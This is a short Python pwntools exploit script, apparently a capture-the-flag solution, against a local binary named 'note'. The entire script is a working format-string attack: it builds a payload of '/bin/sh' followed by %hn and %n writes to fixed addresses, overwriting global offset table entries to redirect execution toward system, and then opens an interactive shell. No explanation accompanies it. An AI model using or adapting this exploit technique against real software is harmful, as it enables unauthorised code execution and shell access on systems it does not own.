from pwn import *
context.log_level="debug"
p=process("./note")
p.readuntil("name?")
debug=1
if debug==0:
	gdb.attach(p,'''
	b *0xf75fac94
	c
	''')
addr=0x804a010
addr2=0x804a08c
vul=0x80485c6#sys_plt+6
payload="/bin/sh"+"%30$34239s"+"%28$hn"+"%30$52s"+"%29$n\0"+p32(addr)+p32(addr2)+p32(0x804800c)
p.sendline(payload)
p.interactive()
